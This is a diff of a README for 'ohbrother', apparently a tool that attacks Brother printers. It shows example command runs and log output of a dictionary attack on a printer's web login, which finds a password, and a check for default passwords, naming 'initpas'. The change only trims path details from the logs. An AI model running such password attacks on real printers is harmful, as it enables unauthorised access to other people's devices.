@@ -25,14 +25,14 @@ Dictionary attack using the default wordlist
 ```
 ┌──(kali㉿kali)-[~]
 └─$ python3 ohbrother.py --ip-address 192.168.0.77
-[00:15:05] {/home/kali/ohbrother.py:60} INFO - [*] Starting a dictionary attack on http://192.168.0.77:80/general/status.html
-[00:16:19] {/home/kali/ohbrother.py:66} INFO - [*] found correct password: shadow
+[00:15:05] INFO - [*] Starting a dictionary attack on http://192.168.0.77:80/general/status.html
+[00:16:19] INFO - [*] found correct password: shadow
 ```
 Ohbrother checks for common default brother passwords
 
 ```
 C:\Users\DrewQ\Desktop\Brother>python main.py --wordlist "C:\Users\DrewQ\Downloads\passwords.txt" --ip-address 192.168.0.77
-[23:14:00] {C:\Users\DrewQ\Desktop\Brother\main.py:49} INFO - [*] default password was set: initpas
+[23:14:00] INFO - [*] default password was set: initpas
 ```
 
 ## Print Spam
